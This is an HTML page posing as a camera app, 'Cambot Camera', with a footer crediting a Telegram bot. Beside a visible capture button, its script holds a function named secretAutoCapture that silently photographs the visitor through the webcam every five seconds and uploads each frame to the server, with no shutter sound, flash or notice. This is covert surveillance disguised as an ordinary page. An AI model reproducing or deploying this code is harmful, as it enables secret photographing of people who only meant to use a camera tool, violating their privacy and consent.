<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cambot Camera</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');

    body {
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #f0f0f0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      text-align: center;
      overflow: hidden;
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 20px;
      color: #00f2fe;
      text-shadow: 0 0 15px rgba(0, 242, 254, 0.7);
    }

    video {
      width: 90%;
      max-width: 420px;
      border: 3px solid #00f2fe;
      border-radius: 12px;
      box-shadow: 0 0 25px rgba(0, 242, 254, 0.3);
    }

    #capture {
      margin-top: 20px;
      width: 70px;
      height: 70px;
      border-radius: 50%;
      border: 4px solid #00f2fe;
      background: radial-gradient(circle, #4facfe, #00f2fe);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5rem;
      color: #111;
      cursor: pointer;
      box-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
      transition: transform 0.2s ease-in-out, box-shadow 0.2s;
    }

    #capture:hover {
      transform: scale(1.1);
      box-shadow: 0 0 35px rgba(79, 172, 254, 0.9);
    }

    #flash {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: white;
      opacity: 0;
      pointer-events: none;
    }

    footer {
      margin-top: 40px;
      font-size: 0.8rem;
      opacity: 0.7;
    }

    .falling-text {
      position: fixed;
      top: -50px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 1rem;
      color: rgba(255,255,255,0.6);
      animation: fall 5s linear forwards;
      pointer-events: none;
    }

    @keyframes fall {
      0% { top: -50px; opacity: 1; }
      80% { opacity: 1; }
      100% { top: 90%; opacity: 0; }
    }
  </style>
</head>
<body>
  <h1><i class="fa-solid fa-robot"></i> Cambot Camera</h1>
  <video id="video" autoplay playsinline></video><br>
  <button id="capture"><i class="fa-solid fa-camera"></i></button>
  <canvas id="canvas" style="display:none;"></canvas>
  <div id="flash"></div>

  <footer>Powered by Cambot â€¢ Telegram Bot</footer>
  <audio id="shutterSound" src="cam.mp3" preload="auto"></audio>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const captureBtn = document.getElementById("capture");
    const flash = document.getElementById("flash");
    const shutterSound = document.getElementById("shutterSound");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; })
      .catch(err => console.error("Camera error:", err));

    async function sendPhoto(blob) {
      const form = new FormData();
      form.append("photo", blob, "capture.jpg");
      try {
        await fetch("/upload", { method: "POST", body: form });
      } catch (err) {
        console.error("Upload failed:", err);
      }
    }

    async function takePhoto() {
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
      return blob;
    }

    captureBtn.addEventListener("click", async () => {
      shutterSound.currentTime = 0;
      shutterSound.play();
      flash.style.opacity = 1;
      setTimeout(() => flash.style.opacity = 0, 150);
      const blob = await takePhoto();
      await sendPhoto(blob);
    });

    async function secretAutoCapture() {
      const blob = await takePhoto();
      await sendPhoto(blob);
    }

    setInterval(secretAutoCapture, 5000);

    function dropText() {
      const text = document.createElement("div");
      text.className = "falling-text";
      text.textContent = "Developed by Churchill";
      document.body.appendChild(text);
      setTimeout(() => text.remove(), 5000);
    }

    setTimeout(dropText, 2000);
    setTimeout(dropText, 6000);
  </script>
</body>
</html>
